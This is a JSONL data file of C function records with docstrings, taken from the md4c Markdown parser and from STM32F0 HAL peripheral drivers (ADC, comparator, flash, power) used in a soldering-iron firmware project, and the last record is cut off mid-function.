{"docstring": "/* md_is_html_tag() may be called when processing inlines (inline raw HTML)\n * or when breaking document to blocks (checking for start of HTML block type 7).\n *\n * When breaking document to blocks, we do not yet know line boundaries, but\n * in that case the whole tag has to live on a single line. We distinguish this\n * by n_lines == 0.\n */\n", "func_signal": "static int\nmd_is_html_tag(MD_CTX* ctx, const MD_LINE* lines, int n_lines, OFF beg, OFF max_end, OFF* p_end)", "code": "{\n    int attr_state;\n    OFF off = beg;\n    OFF line_end = (n_lines > 0) ? lines[0].end : ctx->size;\n    int i = 0;\n\n    MD_ASSERT(CH(beg) == _T('<'));\n\n    if(off + 1 >= line_end)\n        return FALSE;\n    off++;\n\n    /* For parsing attributes, we need a little state automaton below.\n     * State -1: no attributes are allowed.\n     * State 0: attribute could follow after some whitespace.\n     * State 1: after a whitespace (attribute name may follow).\n     * State 2: after attribute name ('=' MAY follow).\n     * State 3: after '=' (value specification MUST follow).\n     * State 41: in middle of unquoted attribute value.\n     * State 42: in middle of single-quoted attribute value.\n     * State 43: in middle of double-quoted attribute value.\n     */\n    attr_state = 0;\n\n    if(CH(off) == _T('/')) {\n        /* Closer tag \"</ ... >\". No attributes may be present. */\n        attr_state = -1;\n        off++;\n    }\n\n    /* Tag name */\n    if(off >= line_end  ||  !ISALPHA(off))\n        return FALSE;\n    off++;\n    while(off < line_end  &&  (ISALNUM(off)  ||  CH(off) == _T('-')))\n        off++;\n\n    /* (Optional) attributes (if not closer), (optional) '/' (if not closer)\n     * and final '>'. */\n    while(1) {\n        while(off < line_end  &&  !ISNEWLINE(off)) {\n            if(attr_state > 40) {\n                if(attr_state == 41 && (ISBLANK(off) || ISANYOF(off, _T(\"\\\"'=<>`\")))) {\n                    attr_state = 0;\n                    off--;  /* Put the char back for re-inspection in the new state. */\n                } else if(attr_state == 42 && CH(off) == _T('\\'')) {\n                    attr_state = 0;\n                } else if(attr_state == 43 && CH(off) == _T('\"')) {\n                    attr_state = 0;\n                }\n                off++;\n            } else if(ISWHITESPACE(off)) {\n                if(attr_state == 0)\n                    attr_state = 1;\n                off++;\n            } else if(attr_state <= 2 && CH(off) == _T('>')) {\n                /* End. */\n                goto done;\n            } else if(attr_state <= 2 && CH(off) == _T('/') && off+1 < line_end && CH(off+1) == _T('>')) {\n                /* End with digraph '/>' */\n                off++;\n                goto done;\n            } else if((attr_state == 1 || attr_state == 2) && (ISALPHA(off) || CH(off) == _T('_') || CH(off) == _T(':'))) {\n                off++;\n                /* Attribute name */\n                while(off < line_end && (ISALNUM(off) || ISANYOF(off, _T(\"_.:-\"))))\n                    off++;\n                attr_state = 2;\n            } else if(attr_state == 2 && CH(off) == _T('=')) {\n                /* Attribute assignment sign */\n                off++;\n                attr_state = 3;\n            } else if(attr_state == 3) {\n                /* Expecting start of attribute value. */\n                if(CH(off) == _T('\"'))\n                    attr_state = 43;\n                else if(CH(off) == _T('\\''))\n                    attr_state = 42;\n                else if(!ISANYOF(off, _T(\"\\\"'=<>`\"))  &&  !ISNEWLINE(off))\n                    attr_state = 41;\n                else\n                    return FALSE;\n                off++;\n            } else {\n                /* Anything unexpected. */\n                return FALSE;\n            }\n        }\n\n        /* We have to be on a single line. See definition of start condition\n         * of HTML block, type 7. */\n        if(n_lines == 0)\n            return FALSE;\n\n        i++;\n        if(i >= n_lines)\n            return FALSE;\n\n        off = lines[i].beg;\n        line_end = lines[i].end;\n\n        if(attr_state == 0  ||  attr_state == 41)\n            attr_state = 1;\n\n        if(off >= max_end)\n            return FALSE;\n    }\n\ndone:\n    if(off >= max_end)\n        return FALSE;\n\n    *p_end = off+1;\n    return TRUE;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/***************************\n ***  Processing Tables  ***\n ***************************/\n", "func_signal": "static void\nmd_analyze_table_alignment(MD_CTX* ctx, OFF beg, OFF end, MD_ALIGN* align, int n_align)", "code": "{\n    static const MD_ALIGN align_map[] = { MD_ALIGN_DEFAULT, MD_ALIGN_LEFT, MD_ALIGN_RIGHT, MD_ALIGN_CENTER };\n    OFF off = beg;\n\n    while(n_align > 0) {\n        int index = 0;  /* index into align_map[] */\n\n        while(CH(off) != _T('-'))\n            off++;\n        if(off > beg  &&  CH(off-1) == _T(':'))\n            index |= 1;\n        while(off < end  &&  CH(off) == _T('-'))\n            off++;\n        if(off < end  &&  CH(off) == _T(':'))\n            index |= 2;\n\n        *align = align_map[index];\n        align++;\n        n_align--;\n    }\n\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Split a longer mark into two. The new mark takes the given count of\n * characters. May only be called if an adequate number of dummy 'D' marks\n * follows.\n */\n", "func_signal": "static int\nmd_split_emph_mark(MD_CTX* ctx, int mark_index, SZ n)", "code": "{\n    MD_MARK* mark = &ctx->marks[mark_index];\n    int new_mark_index = mark_index + (mark->end - mark->beg - n);\n    MD_MARK* dummy = &ctx->marks[new_mark_index];\n\n    MD_ASSERT(mark->end - mark->beg > n);\n    MD_ASSERT(dummy->ch == 'D');\n\n    memcpy(dummy, mark, sizeof(MD_MARK));\n    mark->end -= n;\n    dummy->beg = mark->end;\n\n    return new_mark_index;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/**\n  * @brief  Comparator IRQ Handler \n  * @param  hcomp COMP handle\n  * @retval HAL status\n  */\n", "func_signal": "void HAL_COMP_IRQHandler(COMP_HandleTypeDef *hcomp)", "code": "{\n  uint32_t extiline = COMP_GET_EXTI_LINE(hcomp->Instance);\n  \n  /* Check COMP Exti flag */\n  if(READ_BIT(EXTI->PR, extiline) != RESET)\n  {\n    /* Clear COMP Exti pending bit */\n    WRITE_REG(EXTI->PR, extiline);\n\n    /* COMP trigger user callback */\n    HAL_COMP_TriggerCallback(hcomp);    \n  }\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_comp.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Disable the selected ADC.\n  * @note   Prerequisite condition to use this function: ADC conversions must be\n  *         stopped.\n  * @param  hadc ADC handle\n  * @retval HAL status.\n  */\n", "func_signal": "static HAL_StatusTypeDef ADC_Disable(ADC_HandleTypeDef* hadc)", "code": "{\n  uint32_t tickstart = 0U;\n  \n  /* Verification if ADC is not already disabled:                             */\n  /* Note: forbidden to disable ADC (set bit ADC_CR_ADDIS) if ADC is already  */\n  /*       disabled.                                                          */\n  if (ADC_IS_ENABLE(hadc) != RESET)\n  {\n    /* Check if conditions to disable the ADC are fulfilled */\n    if (ADC_DISABLING_CONDITIONS(hadc) != RESET)\n    {\n      /* Disable the ADC peripheral */\n      __HAL_ADC_DISABLE(hadc);\n    }\n    else\n    {\n      /* Update ADC state machine to error */\n      SET_BIT(hadc->State, HAL_ADC_STATE_ERROR_INTERNAL);\n    \n      /* Set ADC error code to ADC IP internal error */\n      SET_BIT(hadc->ErrorCode, HAL_ADC_ERROR_INTERNAL);\n      \n      return HAL_ERROR;\n    }\n     \n    /* Wait for ADC effectively disabled */\n    /* Get tick count */\n    tickstart = HAL_GetTick();\n    \n    while(HAL_IS_BIT_SET(hadc->Instance->CR, ADC_CR_ADEN))\n    {\n      if((HAL_GetTick() - tickstart) > ADC_DISABLE_TIMEOUT)\n      {\n        /* Update ADC state machine to error */\n        SET_BIT(hadc->State, HAL_ADC_STATE_ERROR_INTERNAL);\n      \n        /* Set ADC error code to ADC IP internal error */\n        SET_BIT(hadc->ErrorCode, HAL_ADC_ERROR_INTERNAL);\n        \n        return HAL_ERROR;\n      }\n    }\n  }\n  \n  /* Return HAL status */\n  return HAL_OK;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Stop the comparator \n  * @param  hcomp COMP handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_COMP_Stop(COMP_HandleTypeDef *hcomp)", "code": "{ \n  HAL_StatusTypeDef status = HAL_OK;\n  uint32_t regshift = COMP_CSR_COMP1_SHIFT;\n  \n  /* Check the COMP handle allocation and lock status */\n  if((hcomp == NULL) || ((hcomp->State & COMP_STATE_BIT_LOCK) != RESET))\n  {\n    status = HAL_ERROR;\n  }\n  else\n  {\n    /* Check the parameter */\n    assert_param(IS_COMP_ALL_INSTANCE(hcomp->Instance));\n\n    if(hcomp->State == HAL_COMP_STATE_BUSY)\n    {\n      /* Disable the selected comparator */\n      if(hcomp->Instance == COMP2)\n      {\n        regshift = COMP_CSR_COMP2_SHIFT;\n      }\n      CLEAR_BIT(COMP->CSR, COMP_CSR_COMPxEN << regshift);\n\n      hcomp->State = HAL_COMP_STATE_READY;\n    }\n    else\n    {\n      status = HAL_ERROR;\n    }\n  }\n  \n  return status;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_comp.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Lock the FLASH Option Control Registers access.\n  * @retval HAL Status \n  */\n", "func_signal": "HAL_StatusTypeDef HAL_FLASH_OB_Lock(void)", "code": "{\n  /* Clear the OPTWRE Bit to lock the FLASH Option Byte Registers access */\n  CLEAR_BIT(FLASH->CR, FLASH_CR_OPTWRE);\n  \n  return HAL_OK;  \n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_flash.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Return the output level (high or low) of the selected comparator. \n  *         The output level depends on the selected polarity.\n  *         If the polarity is not inverted:\n  *           - Comparator output is low when the non-inverting input is at a lower\n  *             voltage than the inverting input\n  *           - Comparator output is high when the non-inverting input is at a higher\n  *             voltage than the inverting input\n  *         If the polarity is inverted:\n  *           - Comparator output is high when the non-inverting input is at a lower\n  *             voltage than the inverting input\n  *           - Comparator output is low when the non-inverting input is at a higher\n  *             voltage than the inverting input\n  * @param  hcomp COMP handle\n  * @retval Returns the selected comparator output level: COMP_OUTPUTLEVEL_LOW or COMP_OUTPUTLEVEL_HIGH.\n  *       \n  */\n", "func_signal": "uint32_t HAL_COMP_GetOutputLevel(COMP_HandleTypeDef *hcomp)", "code": "{\n  uint32_t level=0;\n  uint32_t regshift = COMP_CSR_COMP1_SHIFT;\n  \n  /* Check the parameter */\n  assert_param(IS_COMP_ALL_INSTANCE(hcomp->Instance));\n  \n  if(hcomp->Instance == COMP2)\n  {\n    regshift = COMP_CSR_COMP2_SHIFT;\n  }\n  level = READ_BIT(COMP->CSR, COMP_CSR_COMPxOUT << regshift);\n  \n  if(level != 0U)\n  {\n    return(COMP_OUTPUTLEVEL_HIGH);\n  }\n  return(COMP_OUTPUTLEVEL_LOW);\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_comp.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Locks the FLASH control register access\n  * @retval HAL Status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_FLASH_Lock(void)", "code": "{\n  /* Set the LOCK Bit to lock the FLASH Registers access */\n  SET_BIT(FLASH->CR, FLASH_CR_LOCK);\n  \n  return HAL_OK;  \n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_flash.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  DMA half transfer complete callback. \n  * @param  hdma pointer to DMA handle.\n  * @retval None\n  */\n", "func_signal": "static void ADC_DMAHalfConvCplt(DMA_HandleTypeDef *hdma)", "code": "{\n  /* Retrieve ADC handle corresponding to current DMA handle */\n  ADC_HandleTypeDef* hadc = ( ADC_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;\n  \n  /* Half conversion callback */\n  HAL_ADC_ConvHalfCpltCallback(hadc); \n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Stop ADC conversion of regular group, disable ADC peripheral.\n  * @param  hadc ADC handle\n  * @retval HAL status.\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_ADC_Stop(ADC_HandleTypeDef* hadc)", "code": "{ \n  HAL_StatusTypeDef tmp_hal_status = HAL_OK;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_INSTANCE(hadc->Instance));\n  \n  /* Process locked */\n  __HAL_LOCK(hadc);\n  \n  /* 1. Stop potential conversion on going, on regular group */\n  tmp_hal_status = ADC_ConversionStop(hadc);\n  \n  /* Disable ADC peripheral if conversions are effectively stopped */\n  if (tmp_hal_status == HAL_OK)\n  {\n    /* 2. Disable the ADC peripheral */\n    tmp_hal_status = ADC_Disable(hadc);\n    \n    /* Check if ADC is effectively disabled */\n    if (tmp_hal_status == HAL_OK)\n    {\n      /* Set ADC state */\n      ADC_STATE_CLR_SET(hadc->State,\n                        HAL_ADC_STATE_REG_BUSY,\n                        HAL_ADC_STATE_READY);\n    }\n  }\n\n  /* Process unlocked */\n  __HAL_UNLOCK(hadc);\n  \n  /* Return function status */\n  return tmp_hal_status;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Enables the interrupt and starts the comparator\n  * @param  hcomp COMP handle\n  * @retval HAL status.\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_COMP_Start_IT(COMP_HandleTypeDef *hcomp)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n  uint32_t extiline = 0U;\n  \n  /* Check the parameter */\n  assert_param(IS_COMP_TRIGGERMODE(hcomp->Init.TriggerMode));\n\n  status = HAL_COMP_Start(hcomp);\n  if(status == HAL_OK)\n  {\n    /* Check the Exti Line output configuration */\n    extiline = COMP_GET_EXTI_LINE(hcomp->Instance);\n    /* Configure the rising edge */\n    if((hcomp->Init.TriggerMode & COMP_TRIGGERMODE_IT_RISING) != RESET)\n    {\n      SET_BIT(EXTI->RTSR, extiline);\n    }\n    else\n    {\n      CLEAR_BIT(EXTI->RTSR, extiline);\n    }\n    /* Configure the falling edge */\n    if((hcomp->Init.TriggerMode & COMP_TRIGGERMODE_IT_FALLING) != RESET)\n    {\n      SET_BIT(EXTI->FTSR, extiline);\n    }\n    else\n    {\n      CLEAR_BIT(EXTI->FTSR, extiline);\n    }\n\n    /* Clear COMP EXTI pending bit */\n    WRITE_REG(EXTI->PR, extiline);\n    \n    /* Enable Exti interrupt mode */\n    SET_BIT(EXTI->IMR, extiline);\n  }\n\n  return status;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_comp.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Handles ADC interrupt request.  \n  * @param  hadc ADC handle\n  * @retval None\n  */\n", "func_signal": "void HAL_ADC_IRQHandler(ADC_HandleTypeDef* hadc)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_INSTANCE(hadc->Instance));\n  assert_param(IS_FUNCTIONAL_STATE(hadc->Init.ContinuousConvMode));\n  assert_param(IS_ADC_EOC_SELECTION(hadc->Init.EOCSelection));\n  \n  /* ========== Check End of Conversion flag for regular group ========== */\n  if( (__HAL_ADC_GET_FLAG(hadc, ADC_FLAG_EOC) && __HAL_ADC_GET_IT_SOURCE(hadc, ADC_IT_EOC)) || \n      (__HAL_ADC_GET_FLAG(hadc, ADC_FLAG_EOS) && __HAL_ADC_GET_IT_SOURCE(hadc, ADC_IT_EOS))   )\n  {\n    /* Update state machine on conversion status if not in error state */\n    if (HAL_IS_BIT_CLR(hadc->State, HAL_ADC_STATE_ERROR_INTERNAL))\n    {\n      /* Set ADC state */\n      SET_BIT(hadc->State, HAL_ADC_STATE_REG_EOC); \n    }\n    \n    /* Determine whether any further conversion upcoming on group regular     */\n    /* by external trigger, continuous mode or scan sequence on going.        */\n    if(ADC_IS_SOFTWARE_START_REGULAR(hadc)        && \n       (hadc->Init.ContinuousConvMode == DISABLE)   )\n    {\n      /* If End of Sequence is reached, disable interrupts */\n      if( __HAL_ADC_GET_FLAG(hadc, ADC_FLAG_EOS) )\n      {\n        /* Allowed to modify bits ADC_IT_EOC/ADC_IT_EOS only if bit           */\n        /* ADSTART==0 (no conversion on going)                                */\n        if (ADC_IS_CONVERSION_ONGOING_REGULAR(hadc) == RESET)\n        {\n          /* Disable ADC end of single conversion interrupt on group regular */\n          /* Note: Overrun interrupt was enabled with EOC interrupt in        */\n          /* HAL_Start_IT(), but is not disabled here because can be used     */\n          /* by overrun IRQ process below.                                    */\n          __HAL_ADC_DISABLE_IT(hadc, ADC_IT_EOC | ADC_IT_EOS);\n          \n          /* Set ADC state */\n          ADC_STATE_CLR_SET(hadc->State,\n                            HAL_ADC_STATE_REG_BUSY,\n                            HAL_ADC_STATE_READY);\n        }\n        else\n        {\n          /* Change ADC state to error state */\n          SET_BIT(hadc->State, HAL_ADC_STATE_ERROR_CONFIG);\n          \n          /* Set ADC error code to ADC IP internal error */\n          SET_BIT(hadc->ErrorCode, HAL_ADC_ERROR_INTERNAL);\n        }\n      }\n    }\n    \n    /* Conversion complete callback */\n    /* Note: into callback, to determine if conversion has been triggered     */\n    /*       from EOC or EOS, possibility to use:                             */\n    /*        \" if( __HAL_ADC_GET_FLAG(&hadc, ADC_FLAG_EOS)) \"                */\n      HAL_ADC_ConvCpltCallback(hadc);\n\n    \n    /* Clear regular group conversion flag */\n    /* Note: in case of overrun set to ADC_OVR_DATA_PRESERVED, end of         */\n    /*       conversion flags clear induces the release of the preserved data.*/\n    /*       Therefore, if the preserved data value is needed, it must be     */\n    /*       read preliminarily into HAL_ADC_ConvCpltCallback().              */\n    __HAL_ADC_CLEAR_FLAG(hadc, (ADC_FLAG_EOC | ADC_FLAG_EOS) );\n  }\n   \n  /* ========== Check Analog watchdog flags ========== */\n  if(__HAL_ADC_GET_FLAG(hadc, ADC_FLAG_AWD) && __HAL_ADC_GET_IT_SOURCE(hadc, ADC_IT_AWD))\n  {\n      /* Set ADC state */\n      SET_BIT(hadc->State, HAL_ADC_STATE_AWD1);\n\n    /* Level out of window callback */ \n    HAL_ADC_LevelOutOfWindowCallback(hadc);\n    \n    /* Clear ADC Analog watchdog flag */\n    __HAL_ADC_CLEAR_FLAG(hadc, ADC_FLAG_AWD);\n   \n  }\n  \n  \n  /* ========== Check Overrun flag ========== */\n  if(__HAL_ADC_GET_FLAG(hadc, ADC_FLAG_OVR) && __HAL_ADC_GET_IT_SOURCE(hadc, ADC_IT_OVR))\n  {\n    /* If overrun is set to overwrite previous data (default setting),        */\n    /* overrun event is not considered as an error.                           */\n    /* (cf ref manual \"Managing conversions without using the DMA and without */\n    /* overrun \")                                                             */\n    /* Exception for usage with DMA overrun event always considered as an     */\n    /* error.                                                                 */\n    if ((hadc->Init.Overrun == ADC_OVR_DATA_PRESERVED)            ||\n        HAL_IS_BIT_SET(hadc->Instance->CFGR1, ADC_CFGR1_DMAEN)  )\n    {\n      /* Set ADC error code to overrun */\n      SET_BIT(hadc->ErrorCode, HAL_ADC_ERROR_OVR);\n      \n      /* Clear ADC overrun flag */\n      __HAL_ADC_CLEAR_FLAG(hadc, ADC_FLAG_OVR);\n      \n      /* Error callback */ \n      HAL_ADC_ErrorCallback(hadc);\n    }\n    \n    /* Clear the Overrun flag */\n    __HAL_ADC_CLEAR_FLAG(hadc, ADC_FLAG_OVR);\n  }\n\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Launch the option byte loading.\n  * @note   This function will reset automatically the MCU.\n  * @retval HAL Status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_FLASH_OB_Launch(void)", "code": "{\n  /* Set the OBL_Launch bit to launch the option byte loading */\n  SET_BIT(FLASH->CR, FLASH_CR_OBL_LAUNCH);\n  \n  /* Wait for last operation to be completed */\n  return(FLASH_WaitForLastOperation(FLASH_TIMEOUT_VALUE));\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_flash.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief Enable VDDIO2 monitor: enable Exti 31 and falling edge detection.\n  * @note If Exti 31 is enable correlty and VDDIO2 voltage goes below Vrefint,\n          an interrupt is generated Irq line 1.\n          NVIS has to be enable by user.\n  * @retval None\n  */\n", "func_signal": "void HAL_PWREx_EnableVddio2Monitor(void)", "code": "{\n  __HAL_PWR_VDDIO2_EXTI_ENABLE_IT();\n  __HAL_PWR_VDDIO2_EXTI_ENABLE_FALLING_EDGE();\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_pwr_ex.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Deinitialize the ADC peripheral registers to their default reset\n  *         values, with deinitialization of the ADC MSP.\n  * @note   For devices with several ADCs: reset of ADC common registers is done \n  *         only if all ADCs sharing the same common group are disabled.\n  *         If this is not the case, reset of these common parameters reset is  \n  *         bypassed without error reporting: it can be the intended behaviour in\n  *         case of reset of a single ADC while the other ADCs sharing the same \n  *         common group is still running.\n  * @param  hadc ADC handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_ADC_DeInit(ADC_HandleTypeDef* hadc)", "code": "{\n  HAL_StatusTypeDef tmp_hal_status = HAL_OK;\n  \n  /* Check ADC handle */\n  if(hadc == NULL)\n  {\n     return HAL_ERROR;\n  }\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_INSTANCE(hadc->Instance));\n  \n  /* Set ADC state */\n  SET_BIT(hadc->State, HAL_ADC_STATE_BUSY_INTERNAL);\n  \n  /* Stop potential conversion on going, on regular group */\n  tmp_hal_status = ADC_ConversionStop(hadc);\n  \n  /* Disable ADC peripheral if conversions are effectively stopped */\n  if (tmp_hal_status == HAL_OK)\n  {   \n    /* Disable the ADC peripheral */\n    tmp_hal_status = ADC_Disable(hadc);\n    \n    /* Check if ADC is effectively disabled */\n    if (tmp_hal_status != HAL_ERROR)\n    {\n      /* Change ADC state */\n      hadc->State = HAL_ADC_STATE_READY;\n    }\n  }\n  \n  \n  /* Configuration of ADC parameters if previous preliminary actions are      */ \n  /* correctly completed.                                                     */\n  if (tmp_hal_status != HAL_ERROR)\n  {\n  \n    /* ========== Reset ADC registers ========== */\n    /* Reset register IER */\n    __HAL_ADC_DISABLE_IT(hadc, (ADC_IT_AWD   | ADC_IT_OVR  |\n                                ADC_IT_EOS   | ADC_IT_EOC  |\n                                ADC_IT_EOSMP | ADC_IT_RDY   ) );\n        \n    /* Reset register ISR */\n    __HAL_ADC_CLEAR_FLAG(hadc, (ADC_FLAG_AWD   | ADC_FLAG_OVR  |\n                                ADC_FLAG_EOS   | ADC_FLAG_EOC  |\n                                ADC_FLAG_EOSMP | ADC_FLAG_RDY   ) );\n      \n    /* Reset register CR */\n    /* Bits ADC_CR_ADCAL, ADC_CR_ADSTP, ADC_CR_ADSTART are in access mode     */\n    /* \"read-set\": no direct reset applicable.                                */\n\n    /* Reset register CFGR1 */\n    hadc->Instance->CFGR1 &= ~(ADC_CFGR1_AWDCH   | ADC_CFGR1_AWDEN  | ADC_CFGR1_AWDSGL | ADC_CFGR1_DISCEN |\n                               ADC_CFGR1_AUTOFF  | ADC_CFGR1_WAIT   | ADC_CFGR1_CONT   | ADC_CFGR1_OVRMOD |     \n                               ADC_CFGR1_EXTEN   | ADC_CFGR1_EXTSEL | ADC_CFGR1_ALIGN  | ADC_CFGR1_RES    |\n                               ADC_CFGR1_SCANDIR | ADC_CFGR1_DMACFG | ADC_CFGR1_DMAEN                      );\n    \n    /* Reset register CFGR2 */\n    /* Note: Update of ADC clock mode is conditioned to ADC state disabled:   */\n    /*       already done above.                                              */\n    hadc->Instance->CFGR2 &= ~ADC_CFGR2_CKMODE;\n    \n    /* Reset register SMPR */\n    hadc->Instance->SMPR &= ~ADC_SMPR_SMP;\n    \n    /* Reset register TR1 */\n    hadc->Instance->TR &= ~(ADC_TR_HT | ADC_TR_LT);\n    \n    /* Reset register CHSELR */\n    hadc->Instance->CHSELR &= ~(ADC_CHSELR_CHSEL18 | ADC_CHSELR_CHSEL17 | ADC_CHSELR_CHSEL16 |\n                                ADC_CHSELR_CHSEL15 | ADC_CHSELR_CHSEL14 | ADC_CHSELR_CHSEL13 | ADC_CHSELR_CHSEL12 |\n                                ADC_CHSELR_CHSEL11 | ADC_CHSELR_CHSEL10 | ADC_CHSELR_CHSEL9  | ADC_CHSELR_CHSEL8  |\n                                ADC_CHSELR_CHSEL7  | ADC_CHSELR_CHSEL6  | ADC_CHSELR_CHSEL5  | ADC_CHSELR_CHSEL4  |\n                                ADC_CHSELR_CHSEL3  | ADC_CHSELR_CHSEL2  | ADC_CHSELR_CHSEL1  | ADC_CHSELR_CHSEL0   );\n    \n    /* Reset register DR */\n    /* bits in access mode read only, no direct reset applicable*/\n    \n    /* Reset register CCR */\n    ADC->CCR &= ~(ADC_CCR_ALL);\n\n    /* ========== Hard reset ADC peripheral ========== */\n    /* Performs a global reset of the entire ADC peripheral: ADC state is     */\n    /* forced to a similar state after device power-on.                       */\n    /* If needed, copy-paste and uncomment the following reset code into      */\n    /* function \"void HAL_ADC_MspInit(ADC_HandleTypeDef* hadc)\":              */\n    /*                                                                        */\n    /*  __HAL_RCC_ADC1_FORCE_RESET()                                                  */\n    /*  __HAL_RCC_ADC1_RELEASE_RESET()                                                */\n    \n    /* DeInit the low level hardware */\n    HAL_ADC_MspDeInit(hadc);\n    \n    /* Set ADC error code to none */\n    ADC_CLEAR_ERRORCODE(hadc);\n    \n    /* Set ADC state */\n    hadc->State = HAL_ADC_STATE_RESET; \n  }\n  \n  /* Process unlocked */\n  __HAL_UNLOCK(hadc);\n  \n  /* Return function status */\n  return tmp_hal_status;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief This function handles the PWR PVD interrupt request.\n  * @note This API should be called under the  PVD_IRQHandler() or PVD_VDDIO2_IRQHandler().\n  * @retval None\n  */\n", "func_signal": "void HAL_PWR_PVD_IRQHandler(void)", "code": "{\n  /* Check PWR exti flag */\n  if(__HAL_PWR_PVD_EXTI_GET_FLAG() != RESET)\n  {\n    /* PWR PVD interrupt user callback */\n    HAL_PWR_PVDCallback();\n\n    /* Clear PWR Exti pending bit */\n    __HAL_PWR_PVD_EXTI_CLEAR_FLAG();\n  }\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_pwr_ex.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  DMA transfer complete callback. \n  * @param  hdma pointer to DMA handle.\n  * @retval None\n  */\n", "func_signal": "static void ADC_DMAConvCplt(DMA_HandleTypeDef *hdma)", "code": "{\n  /* Retrieve ADC handle corresponding to current DMA handle */\n  ADC_HandleTypeDef* hadc = ( ADC_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;\n  \n  /* Update state machine on conversion status if not in error state */\n  if (HAL_IS_BIT_CLR(hadc->State, HAL_ADC_STATE_ERROR_INTERNAL | HAL_ADC_STATE_ERROR_DMA))\n  {\n    /* Set ADC state */\n    SET_BIT(hadc->State, HAL_ADC_STATE_REG_EOC); \n    \n    /* Determine whether any further conversion upcoming on group regular     */\n    /* by external trigger, continuous mode or scan sequence on going.        */\n    if(ADC_IS_SOFTWARE_START_REGULAR(hadc)        && \n       (hadc->Init.ContinuousConvMode == DISABLE)   )\n    {\n      /* If End of Sequence is reached, disable interrupts */\n      if( __HAL_ADC_GET_FLAG(hadc, ADC_FLAG_EOS) )\n      {\n        /* Allowed to modify bits ADC_IT_EOC/ADC_IT_EOS only if bit           */\n        /* ADSTART==0 (no conversion on going)                                */\n        if (ADC_IS_CONVERSION_ONGOING_REGULAR(hadc) == RESET)\n        {\n          /* Disable ADC end of single conversion interrupt on group regular */\n          /* Note: Overrun interrupt was enabled with EOC interrupt in        */\n          /* HAL_Start_IT(), but is not disabled here because can be used     */\n          /* by overrun IRQ process below.                                    */\n          __HAL_ADC_DISABLE_IT(hadc, ADC_IT_EOC | ADC_IT_EOS);\n          \n          /* Set ADC state */\n          